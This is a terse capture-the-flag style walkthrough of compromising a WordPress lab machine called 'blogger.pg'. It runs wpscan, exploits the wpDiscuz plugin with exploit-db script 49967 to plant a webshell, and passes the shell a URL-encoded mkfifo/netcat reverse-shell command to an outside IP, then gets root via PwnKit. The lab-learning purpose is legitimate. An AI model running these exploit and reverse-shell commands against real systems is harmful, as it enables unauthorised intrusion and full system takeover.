
### Initial Foothold
nmap scan to reveal port 22, 80. ssh brute scripts get nothing.\
feroxbuster with raft medium directory to reveal a page that is /blog.\
Add blogger.pg to /etc/hosts as some of the websites were not loading\
It is a wordpress site. wpscan for plugins\
`wpscan --url http://blogger.pg/assets/fonts/blog --plugins-detection aggressive --disable-tls-checks`\
wpscan shows XML-RPC and wpDiscuz. Search on exploitdb. XML-RPC did not work.\
wpDiscuz worked\
`python 49967.py -u http://blogger.pg/assets/fonts/blog -p /?p=29   `\
go to below site and it is a webshell\
`http://blogger.pg/assets/fonts/blog/wp-content/uploads/2026/11/zzclscafjjhihnq-1794410484.8944.php`\
Run penelope at port 4444.\
Add this to the above URL:`?cmd=rm %2Ftmp%2Ff%3Bmkfifo %2Ftmp%2Ff%3Bcat %2Ftmp%2Ff|sh -i 2>%261|nc 192.168.45.220 4444 >%2Ftmp%2Ff`\
Obtain a reverse shell on penelope.

### Privesc
Discover SUID bit on pkexec. Suspect PwnKit. Run linpeas.sh and discover it is possible.\
Transfer and run PwnKit. Obtain root.
